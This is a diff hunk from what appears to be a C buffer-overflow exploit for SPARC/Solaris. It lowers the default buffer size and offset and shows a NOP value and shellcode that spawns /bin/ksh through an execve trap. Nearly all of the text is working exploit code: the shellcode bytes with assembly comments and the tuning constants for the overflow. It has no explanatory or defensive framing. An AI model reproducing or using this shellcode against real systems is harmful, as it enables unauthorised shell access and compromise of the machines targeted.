@@ -29,8 +29,8 @@
 //#include "/afs/nd.edu/sun4x_55/opt/SUNWspro/SC4.2/include/CC/sysent.h"
 
 #define MAXL 512  // max string length
-#define DEFAULT_BSIZE 400
-#define DEFAULT_OFFSET 1600
+#define DEFAULT_BSIZE 300
+#define DEFAULT_OFFSET 1200
 
 char nop_[]="\xac\x15\xa1\x6e";
 char shellcode[]=         /* 10*4+8 bytes */ "\x20\xbf\xff\xff"   /* bn,a  */ "\x20\xbf\xff\xff"   /* bn,a  */ "\x7f\xff\xff\xff"   /* call  */ "\x90\x03\xe0\x20"   /* add %o7,32,%o0 */ "\x92\x02\x20\x10"   /* add %o0,16,%o1 */ "\xc0\x22\x20\x08"   /* st %g0,[%o0+8] */ "\xd0\x22\x20\x10"   /* st %o0,[%o0+16] */ "\xc0\x22\x20\x14"   /* st %g0,[%o0+20] */ "\x82\x10\x20\x0b"   /* mov 0x0b,%g1 */ "\x91\xd0\x20\x08"   /* ta 8 */ "/bin/ksh" ;
